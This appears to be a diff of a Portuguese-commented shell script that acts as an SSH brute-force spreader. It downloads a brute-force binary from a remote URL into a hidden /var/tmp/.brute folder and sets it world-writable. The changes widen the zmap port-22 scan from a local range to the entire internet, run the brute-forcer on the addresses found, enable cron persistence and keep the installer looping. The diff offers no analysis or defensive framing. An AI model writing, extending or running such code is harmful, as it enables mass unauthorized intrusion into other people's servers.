@@ -21,11 +21,15 @@ cd /var/tmp  ; cd .brute
 
 wget $brute_url  -O brute || curl  -L $brute_url -o brute
 
+
 chmod 777 brute && chmod 777 zmap
 
-timeout   5s ./zmap  -p 22   192.168.1.1/10  > ips  #50 segundos para  pega os ips
 
-timeout   5s    ./brute  #50 segundos para  testa o   ip
+timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
+
+
+timeout   120s    ./brute  #120 segundos para  testa o   ip
+
 
 return
 
@@ -42,11 +46,12 @@ install_zmap(){
 
 cd /var/tmp 
 
-out_cat=$(cat .brute/zmap )
+out_cat=$(cat .brute/zmap )  #troca  cat por ls
+
 
 if (( ! $?  )) ; then 
 
-echo zmap ja foi instalado
+echo "zmap instaled ok"
 
 brute
 
@@ -96,12 +101,6 @@ fi; #nao so root
 
 
 
-
-
-
-
-
-
 cron() {
 
 cron_out=$( crontab -l )
@@ -141,13 +140,13 @@ init() {
 while true ; do
 install_zmap
 
-sleep   3
+sleep   5
 
 done
 
 
 
-#cron
+cron  &
 
 
 
